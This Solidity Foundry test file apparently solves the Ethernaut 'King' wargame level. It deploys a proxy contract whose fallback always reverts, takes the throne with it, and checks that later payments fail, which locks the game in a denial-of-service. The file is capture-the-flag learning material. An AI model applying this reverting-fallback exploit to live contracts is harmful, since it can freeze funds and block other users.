// SPDX-License-Identifier: UNLICENSED

// forge test --contracts src/test/King.t.sol --fork-url $rpc -vvvv
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../King.sol";

contract ProxyKing {
    constructor() public payable {}
    fallback() external payable {
        revert("I wont let you become a king");
    }
}
contract KingTest is DSTest {
    King obj;
    ProxyKing proxy_king;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address contract_address;
    function setUp() public {    
        contract_address = 0x3870e4882738ce551F360D588a308B86bBD90858;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        obj = King(payable(contract_address));
        // obj = new King{value: 100000000000000 wei}();
        proxy_king = new ProxyKing{value: 1 ether}();
    }

    function testAvoidSelfProclamation() public {
        vm.startPrank(address(proxy_king));
        console.log("Contract Address =", contract_address);
        console.log("Proxy king Address =", address(proxy_king));
        console.log("King initial state =", obj._king());      
        console.log("King initial prize =", obj.prize());  
        console.log("King initial balance =", address(obj).balance);   
        console.log("ProxyKing initial balance =", address(proxy_king).balance);   
        (bool success, ) = address(obj).call{value: obj.prize() + 1}("");
        require(success, "Tx failed");
        // payable(address(obj)).transfer(100 wei);
        
        console.log("King end state =", obj._king());
        console.log("King end prize =", obj.prize());
        assert(obj._king() == address(proxy_king));
        vm.stopPrank();
        // vm.expectRevert(bytes("error message"));
        (success, ) = address(obj).call{value: 100}("");
        console.log("Success =", success); 
        assertTrue(success == false);
    }
}
